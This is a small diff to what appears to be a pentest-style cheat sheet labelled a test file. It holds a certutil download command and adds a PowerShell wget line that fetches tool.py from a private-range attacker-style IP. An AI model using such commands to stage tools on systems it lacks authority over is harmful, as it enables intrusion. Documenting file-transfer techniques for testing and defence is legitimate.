@@ -123,6 +123,9 @@ This is a test file
 
 ```cmd 
 certutil -urlcache -split -f https://server/file.txt c:\file.txt
+
+
+powershell  wget http://10.10.14.2/tool.py -o tool.py 
 ```
 
 # Upload Operations
